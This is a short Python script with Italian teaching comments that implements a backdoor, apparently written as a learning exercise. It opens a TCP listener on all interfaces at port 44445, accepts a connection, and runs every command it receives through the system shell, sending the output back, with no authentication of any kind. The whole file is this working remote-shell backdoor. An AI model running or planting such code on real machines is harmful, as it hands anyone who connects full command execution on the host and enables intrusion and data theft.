import socket as so
import subprocess
import os

# non so dove verra' eseguita, meglio usare tutte le schede: lo spiego con 0.0.0.0
SRV_ADDR = "0.0.0.0"
SRV_PORT = 44445

# prima di poter usare socket devo chiamare 
# socket e' estremamente generico qui chiedo ipv4 e tcp
s = so.socket(so.AF_INET, so.SOCK_STREAM)
s.setsockopt(so.SOL_SOCKET, so.SO_REUSEADDR, 1) # Utile per riavviare il server
# prima devo configurare l'istanza di socket
# voglio chiedere di configurarsi in ascolto
s.bind((SRV_ADDR, SRV_PORT))

# spiego quante connessioni puo' accettare
s.listen(1)

print(f"Backdoor in ascolto su {SRV_PORT}")
# Arrivati a questo punto quando do s.accept() attedera' che una connessione venga stabilita
# accept crea una tupla, la connessione stessa e informazioni
connection, address = s.accept()
# a questo punto il programma riprende
print("Connesso con:", address)
# avvio un ciclo infinito
while True:
    # cerco il percorso attuale
    cwd = os.getcwd()

    # mando un messaggio il path corrente
    connection.sendall(f"{cwd}: ".encode())
    # attendo la sua risposta per max 1024 caratteri
    # data = connection.recv(1024) # dati binari
    # data = data.decode('utf-8') # converto i dati in stringa
    # data = data.strip() # pulsico la stringa da sporcature come l'accapo ("\n")
    # preferisco fare tutto in una sola riga
    data = connection.recv(1024).decode('utf-8').strip()

    # se il sock chiude la connessione o l'utente chiede di uscire chiudo il ciclo infinito 
    if not data or data == "exit": break
    
    # gestisco il cambio directory
    if data.startswith("cd "):
        try:
            # e' qui che dico al sistema di cambiare directory 
            os.chdir(data.split(" ",1)[1])
            connection.sendall(b"Diretory cambiata\n")
        except:
            connection.sendall(b"errore\n")

    # ESECUZIONE COMANDO
    # shell=True permetto di usare comandi concatenati (es. ls -la | grep txt)
    # capture_output cattuttura i messaggi stdout e stderr, rispettivamente testo ed errori
    proc = subprocess.run(data, shell=True, capture_output=True)

    # Invio il risultato
    output = proc.stdout + proc.stderr

    if not output: output = b"eseguito\n"

    connection.sendall(output)

# se esce dal ciclo chiudo la connessione, cosi' libero la porta
connection.close()


